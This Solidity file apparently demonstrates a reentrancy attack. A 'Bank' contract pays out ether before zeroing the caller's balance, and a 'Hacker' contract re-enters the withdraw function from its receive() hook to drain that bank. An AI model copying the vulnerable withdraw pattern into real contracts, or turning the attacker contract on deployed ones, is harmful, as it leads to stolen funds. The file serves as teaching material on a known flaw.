// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Bank {
    mapping (address => uint256) userBalance;
   
   // returns the balance of the user passed as parameter
    function getBalance(address u) public view returns(uint256){
        return userBalance[u];
    }

    // returns the balance of the contract
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    // deposit the amount passed with the call to the balance of the user
    function addToBalance() public payable{
        userBalance[msg.sender] += msg.value;
    }   

    // withdraw the whole balance of the user
    function withdrawBalance() public payable  {
        (bool sent, ) = msg.sender.call{value: userBalance[msg.sender]}("");
        userBalance[msg.sender] = 0;
    }   
}

contract Hacker {
    Bank bank;

    constructor(address _a) {
        bank = Bank(_a);
    }
    
    // returns the balance of the contract
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    // attack the bank contract
    function attack() public payable {
        require(msg.value >= 1 ether);
        bank.addToBalance{value: msg.value}();
        bank.withdrawBalance();
    }

    // fallback function which is called when the bank contract sends the ether
    receive() external payable {
        if(bank.getBalance() > 0){
            bank.withdrawBalance();
        }
    }
}